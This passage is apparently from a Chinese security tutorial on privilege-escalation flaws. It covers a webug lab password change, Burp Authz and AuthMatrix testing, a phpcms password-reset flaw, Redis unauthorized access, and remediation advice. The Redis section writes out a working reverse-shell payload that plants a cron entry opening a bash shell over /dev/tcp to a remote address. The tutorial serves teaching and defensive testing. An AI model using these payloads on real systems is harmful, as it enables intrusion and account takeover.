例如如上接口，修改用户信息，当我们点击某个系统的修改自身资料时，会发送一个类似的json数据包，其中userid对应我们自己的用户id，修改后，可以修改对应id的用户资料。修改方式类似问题1。区别在于一个页面可见，一个页面不直观可见，一个查询，一个修改。需要配合其他越权查询漏洞，或者账号来识别是否修改成功。
# 3\. 漏洞靶场测试
漏洞环境：phpstudy，webug4.0
靶场介绍：国产靶场，漏洞齐全，演示也相当完善。其中还分为初，中，高。虽然高好像没东西，但仍然是一个不错的靶场环境。
漏洞演示：演示为靶场的22号漏洞，越权修改密码
靶场安装：
把sql目录中的文件安装到数据库，新建三个按照文件名的数据库，导入数据文件，修改data目录下的dbconfig和dbconn文件，修改为自己的数据库账号密码和数据库名。修改完成后建议把网站目录修改为webug的目录下。直接访问本地地址即可。
另外需要修改/control/auth_cross/cross_auth_passwd.php文件下的一段代码，不然跳转到错误路径：
    header("Location:/pt_env/control/auth_cross/cross_auth_passwd2.php?id={$id}")
    修改为：
    header("Location:/control/auth_cross/cross_auth_passwd2.php?id={$id}")
点击第一个越权修改密码后进入如下页面：
此处我打开了数据库来对应查看修改密码的情况，打开webug数据库下的user_test表，可以看到其中有两个用户如下：
此处利用aaaaa用户修改admin用户密码，利用aaaaa账户登陆后，看到如下界面
此处，我们可以先正常走一遍逻辑来查看其中的数据包情况，把aaaaa的密码修改为aaaaa，弹窗OK。然后查看抓取到的数据包。
其中有旧密码和新密码两个参数，理论上如果效验了旧密码和账号的一致性，就算链接中的id可以修改越权也无法修改密码，会提示旧密码不正确，但此处并没有效验旧密码和账号的一致性，导致修改链接中的2为1，post参数不变，或者任意旧密码值，便可以修改admin的密码。
查看数据库修改是否成功：
此处的问题存在两点，一是修改的用户身份由链接中的ID来决定，二是没有对旧密码和账户进行身份验证。
# 4\. 工具测试
对于越权类的安全问题，并没有自动化测试工具来发现和识别，至少现在没有发现哪里有完善的越权检测工具和扫描器。
此处介绍一款burp的越权插件，辅助检测越权漏洞，但是只能检测基于功能的越权，并不能自动的检测需要修改参数来判断越权形式的漏洞。
在burp的Extender选项中选择BApp
Store选项卡，找到Authz插件，点击install。安装完成后选项卡中会出现一个Authz的新选项卡，界面如下：
此处需要两个用户身份，假设为A用户和B用户，登陆A用户的账号，获取Cookie到new
header中，使用B账号抓包获取信息。到proxy中选择需要测试的功能地址，右键到Send requests to Authz。
获取够需要测试的功能后，到Authz界面点击run即可运行，此处没有设置cookie，那么将按照未授权访问来测试。
其中，会在请求中替换我们输入的cookie值，如图显示，源请求的字节长度，请求的字节长度，源请求的响应码，请求的响应码，通过对响应的差别来查看是否存在越权漏洞。
能达到此检测目的的还有一款插件AuthMatrix，也同样可以检测越权，功能强劲，使用较Authz复杂，对于高要求，多用户，需要对请求中的token等进行选择替换的，可以使用此插件。
介绍地址：
# 5\. CMS演示
## 5.1 前台任意修改其他用户信息
漏洞环境：phpstudy，phpcms9.5.9
漏洞介绍：phpcms设计缺陷导致前台用户可以任意修改其他用户密码
漏洞下载：
解压安装到phpstudy，访问后需要安装，按照安装要求，填入账号密码。等待安装完成，将自动跳转到后台管理页面。登陆后台需要先添加邮箱认证，如下添加的腾讯邮箱。具体腾讯授权码获取方式可以查看：[https://service.mail.qq.com/cgi-bin/help?subtype=1&id=28&no=1001256](https://service.mail.qq.com/cgi-bin/help?subtype=1&id=28&no=1001256)
在用户模块中添加如下信息，新增两个测试用户，类似如下，需要其中一个可以接收邮件。
在站点首页点击登陆处，如果跳转到404安装页面，可能是你没有删除install安装目录，删除访问index.php即可。选择忘记密码->用户名找回密码
点击获取邮箱效验码
返回上一步输入想修改的用户，如下test2
输入之前的邮箱验证码提交
点击后显示密码修改成功为以下：
尝试使用新密码登陆成功：
漏洞修复：此问题出现原因在于验证码没有跟账号做绑定，验证时只做了验证码是否有效的判断。对于此类问题，频繁出现在手机号验证码，邮箱验证码处，在最后执行修改时需要一同验证，验证码和手机或者邮箱的对应关系。
## 5.2 redis未授权访问
漏洞环境：Ubuntu，reids 3.2.0
漏洞介绍：Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以写入文件来反弹shell
安装如下：
    wget http://download.redis.io/releases/redis-3.2.0.tar.gz
    tar xzf redis-3.2.0.tar.gz
    cd redis-3.2.0
    make
修改配置文件
    vi redis.conf
    bind 127.0.0.1 加上#
    protected-mode yes  改为no
在配置文件目录下启动
    ./src/redis-server redis.conf
启动后显示如下：
通过reids命令可以查看基本信息
尝试反弹shell到指定地址
    set x "\n* * * * * bash -i >& /dev/tcp/192.168.30.79/2333 0>&1\n"
    config set dir /var/spool/cron/
    config set dbfilename root
    save
或者采用gopher协议，直接利用curl一条命令执行
# 6\. 漏洞修复
1、验证需要从前端获取的参数，比如用户ID和角色权限名，对于需要根据前台请求来返回数据的参数进行权限效验。
2、对于固定返回信息可以使用特定链接地址返回，同时采用不可预测地址，如：getuserinfo_snhx.php
3、对于需要修改、新增等功能进行判断，根据当前seesion判断用户，参数中只传输修改的用户信息。
4、区分用户和管理员时，不采用某些相同的参数来区别。如dede区分管理和用户都是采用ID值，容易产生问题。
5、对于查询类越权需要对每一次请求的参数做当前用户身份效验，避免水平越权。